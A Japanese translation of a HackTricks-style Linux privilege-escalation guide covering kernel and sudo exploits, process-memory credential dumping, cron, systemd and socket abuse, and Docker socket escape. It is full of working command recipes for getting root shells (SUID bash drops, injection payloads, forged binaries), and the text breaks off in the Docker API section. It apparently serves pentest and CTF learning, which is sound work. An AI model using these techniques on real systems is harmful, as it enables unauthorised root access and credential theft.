# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSについての情報を収集し始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

もし `PATH` 変数内の任意のフォルダに**書き込み権限がある**場合、いくつかの libraries や binaries を hijack できる可能性があります：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privileges に使用できる exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストといくつかの既に **compiled exploits** はここで見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱なカーネルのバージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルエクスプロイトの検索に役立つツールは以下です:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

常に **Googleでカーネルバージョンを検索** してください。あなたのカーネルバージョンが既知の kernel exploit に記載されていれば、その exploit が有効であることを確認できます。

追加のカーネルエクスプロイト手法:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux 権限昇格 - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

次に示す脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
この grep を使って、sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudoの1.9.17p1以前のバージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、非特権のローカルユーザーがユーザー管理ディレクトリから `/etc/nsswitch.conf` ファイルが使用される場合に、sudo `--chroot` オプションを使ってroot権限に昇格できてしまいます。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

詳しくは、オリジナルの [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

この脆弱性がどのように悪用されるかの**例**については、**smasher2 box of HTB**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 追加のシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container内にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

どこに**what is mounted and unmounted**があるのか、なぜそうなっているのかを確認してください。何かが unmounted の場合は、それを mount して機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**何らかのコンパイラがインストールされているか**を確認してください。これは、kernel exploit を使用する必要がある場合に役立ちます。kernel exploit は、実際に使用するマシン（または類似のマシン）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストールされているパッケージおよびサービスのバージョン**を確認してください。たとえば古いNagiosのバージョンが存在し、escalating privilegesに悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHアクセスがある場合、**openVAS**を使ってマシン内にインストールされている古く脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことに注意してください。したがって、OpenVAS や同様のアプリケーションを使用して、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかを確認することを推奨します_

## プロセス

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来より多くの権限を持っている**かをチェックしてください（例えば root で実行されている tomcat など）
```bash
ps aux
ps -ef
top -n 1
```
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) を確認してください。これらは悪用して権限昇格できる可能性があります。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックしてそれらを検出します。\
また、**プロセスのバイナリに対する権限を確認**してください。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

プロセスの監視には [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、頻繁に実行される、あるいは特定の条件が満たされたときに実行される脆弱なプロセスを特定するのに非常に有用です。

### Process memory

サーバのいくつかのサービスは、メモリ内に**資格情報をプレーンテキストで保存**することがあります。\
通常、他ユーザーに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常すでにrootでありさらに資格情報を探したい場合に有用です。\
ただし、**一般ユーザーとして自分が所有するプロセスのメモリは読める**ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同一uidであればすべてのプロセスをデバッグ可能です。これは古典的なptraceの動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使用できるのは管理者のみ（CAP_SYS_PTRACE が必要）です。
> - **kernel.yama.ptrace_scope = 3**: ptrace で追跡できるプロセスはありません。一度設定すると ptrace を再度有効にするには再起動が必要です。

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の資格情報を探索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示します**。また、**各マップ領域の権限**も表示します。

**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。 この情報を使って、**mem ファイル内をシークし、読み取り可能な領域をすべてダンプ**してファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみ読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Linux向けに再構想された、WindowsのSysinternalsツールスイートにある古典的なProcDumpツールです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには次を使用できます：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの資格情報

#### 手動の例

authenticator プロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdump（プロセスのメモリをdumpするさまざまな方法は前のセクションを参照してください）して、メモリ内の認証情報を検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は **メモリから平文の認証情報を盗み**、いくつかの **よく知られたファイルからも取得します**。動作するには root 権限が必要です。

| 機能                                              | プロセス名            |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali デスクトップ, Debian デスクトップ)       | gdm-password         |
| Gnome Keyring (Ubuntu デスクトップ, ArchLinux デスクトップ) | gnome-keyring-daemon |
| LightDM (Ubuntu デスクトップ)                          | lightdm              |
| VSFTPd (アクティブな FTP 接続)                   | vsftpd               |
| Apache2 (アクティブな HTTP Basic 認証セッション)         | apache2              |
| OpenSSH (アクティブな SSH セッション - sudo 使用時)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.

典型的なチェーン
- `ss -ntlp` / `curl -v localhost:8000` で loopback のみにバインドされたポート（例: 127.0.0.1:8000）と Basic-Auth リームを発見する
- 運用アーティファクト内の資格情報を探す:
  - `zip -P <password>` を使ったバックアップ／スクリプト
  - systemd ユニットが `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を公開している
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成してすぐに実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使い方:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
- Enable audit/logging for on-demand job executions

チェック：スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを利用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? use symlinks? root が使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中には次のような PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root が PATH を設定せずに何らかのコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次を使って root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cronがワイルドカードを含むスクリプトを使用している場合 (Wildcard Injection)

スクリプトがrootによって実行され、コマンド内に“**\***”が含まれている場合、予期しない動作（例えばprivesc）を引き起こすように悪用できます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの前に置かれている場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も同様です）。**

次のページを参照して、ワイルドカード悪用の追加トリックを確認してください:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...)) および let の算術評価の前に parameter expansion と command substitution を実行します。もし root cron/parser が untrusted log fields を読み取りそれらを算術コンテキストに渡すと、攻撃者は cron 実行時に root として実行される command substitution $(...) を注入できます。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に attacker-controlled なテキストを書き込み、数値に見えるフィールドに command substitution が含まれ末尾が数字になるようにします。算術評価が有効であるように、コマンドが stdout に出力しない（またはリダイレクトする）ことを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **cron script を変更できる** なら、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が **directory where you have full access** を使っている場合、その folder を削除して、あなたが制御する script を提供する別の場所を指す **create a symlink folder to another one** を作成するのが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### シンボリックリンクの検証と安全なファイル処理

パスでファイルを読み書きする特権付きスクリプト/バイナリをレビューする際は、リンクがどのように扱われるかを確認してください:

- `stat()` はシンボリックリンクをたどり、ターゲットのメタデータを返します。
- `lstat()` はリンク自身のメタデータを返します。
- `readlink -f` および `namei -l` は最終ターゲットの解決を助け、各パスコンポーネントのパーミッションを表示します。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のツールも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (起動するすべてのプロセスを監視して一覧表示します)。

### 攻撃者が設定したモードビットを保持する root バックアップ (pg_basebackup)

root所有の cron が `pg_basebackup`（または任意の recursive copy）を、あなたが書き込めるデータベースディレクトリに対して実行している場合、**SUID/SGID binary** を植え付けることで、そのバイナリが同じモードビットのまま **root:root** としてバックアップ出力に再コピーされます。

典型的な発見フロー（低権限のDBユーザとして）:
- `pspy` を使って、rootの cron が `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを毎分実行しているのを確認する。
- ソースクラスタ（例: `/var/lib/postgresql/14/main`）があなたによって書き込み可能であり、ジョブ実行後に宛先（`/opt/backups/current`）が root 所有になることを確認する。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` がクラスターをコピーする際にファイルモードビットを保持するために動作します。root によって呼び出されると、宛先ファイルは **root 所有 + 攻撃者が選んだ SUID/SGID** を継承します。パーミッションを保持したまま実行可能な場所に書き込む同様の特権付きバックアップ/コピー処理も脆弱です。

### 不可視な cron jobs

コメントの後に **キャリッジリターンを入れる**（改行文字は入れない）ことで cronjob を作成でき、cronjob は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込みできる場合は、それを**変更することができ**、サービスが**起動**、**再起動**または**停止**されたときにあなたの**backdoor**を**実行させる**ようにできます（マシンの再起動を待つ必要があるかもしれません）。\
例えば `.service` ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`**

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに対して**書き込み権限がある**場合、それらを改変して backdoors を仕込み、サービスが再実行されたときに backdoors が実行されるようにできます。

### systemd PATH - 相対パス

systemd が使用する PATH は以下で確認できます：
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**relative paths being used on service configurations**が使われていないかを検索する必要があります。例えば:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
その後、書き込み可能な systemd の PATH フォルダ内に、相対パスのバイナリと同じ名前の**実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されたとき、あなたの**バックドアが実行されます**（通常、権限のないユーザはサービスの開始/停止はできませんが、`sudo -l` が使えるか確認してください）。

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時刻イベントと単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として使用できます。

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> この timer が経過したときにアクティブ化される Unit。引数はユニット名で、そのサフィックスは ".timer" ではありません。指定しない場合、この値は timer unit と同じ名前（サフィックスを除く）を持つ service にデフォルトされます。（上記参照）アクティブ化される unit 名と timer unit の unit 名は、サフィックスを除いて同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- 書き込み可能なバイナリを実行している systemd unit（例えば `.service`）を見つける
- 相対パスを実行している systemd unit を見つけ、かつその実行ファイルを偽装するために **systemd PATH** に対して **書き込み権限** があること

**Learn more about timers with `man systemd.timer`.**

### **Timer を有効化する**

Timer を有効化するには root privileges が必要で、次を実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に対してシンボリックリンクを作成することで **有効化されます**

## Sockets

Unix Domain Sockets (UDS) はクライアント-サーバーモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。標準的な Unix ディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルで設定されます。

ソケットは `.socket` ファイルを使って設定できます。

**詳細は `man systemd.socket` を参照してください。** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要約としてソケットがどこで待ち受けるかを**指定**するために使われます（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 および/またはポート番号など）。
- `Accept`: ブール引数を取ります。もし **true** なら、**各着信接続ごとに service インスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。もし **false** なら、すべてのリッスンソケット自体が**起動された service ユニットに渡され**、すべての接続に対して1つの service ユニットのみが生成されます。この値はデータグラムソケットおよび FIFO では無視され、単一の service ユニットが無条件にすべての着信トラフィックを処理します。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方式で書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンしている **sockets**/FIFOs がそれぞれ **作成され**バインドされる前または後に**実行**されます。コマンドラインの最初のトークンは絶対パスのファイル名である必要があり、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンしている **sockets**/FIFOs がそれぞれ**閉じられ**削除される前または後に**実行される**追加の**コマンド**です。
- `Service`: **incoming traffic** に対して **activate** する **service** ユニット名を指定します。この設定は Accept=no の sockets のみ許可されます。デフォルトではソケットと同じ名前のサービス（サフィックスを置換）になります。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

もし **書き込み可能な** `.socket` ファイルを見つけたら、[Socket] セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を **追加** できます。するとバックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンを再起動するまで待つ必要がある**でしょう。\
_注: システムがそのソケットファイルの設定を使用している必要があり、そうでない場合バックドアは実行されません_

### Socket activation + writable unit path (create missing service)

別の影響の大きいミスコンフィギュレーションは次のとおりです:

- `Accept=no` と `Service=<name>.service` を持つ socket unit
- 参照されている service unit が存在しない
- 攻撃者が `/etc/systemd/system` (または他の unit 検索パス) に書き込める

その場合、攻撃者は `<name>.service` を作成し、ソケットにトラフィックを送って systemd が新しいサービスを root としてロードして実行するようにできます。

簡単なフロー:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能な sockets

もし**任意の writable socket を検出できれば**（_ここで言っているのは Unix Sockets で、設定の `.socket` ファイルのことではありません_）、そのソケットと**通信できます**し、脆弱性を悪用できる可能性があります。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: **sockets listening for HTTP** リクエストが存在する場合があります（_.socket filesではなく、unix socketsとして動作するファイルのことを指しているわけではありません_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
もしその socket が **HTTP** で応答する場合、**通信** が可能になり、場合によっては **脆弱性を悪用できる** ことがあります。

### 書き込み可能な Docker Socket

Docker socket（通常 `/var/run/docker.sock` にあります）は保護すべき重要なファイルです。デフォルトでは、`root` ユーザと `docker` グループのメンバが書き込み可能です。この socket への書き込み権限を持つと、privilege escalation に繋がる可能性があります。以下はその実行方法と、Docker CLI が利用できない場合の代替手段の内訳です。

#### **Privilege Escalation with Docker CLI**

Docker socket に書き込み権限がある場合、次のコマンドで privilege escalation が可能です：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスするコンテナを実行できるようにします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
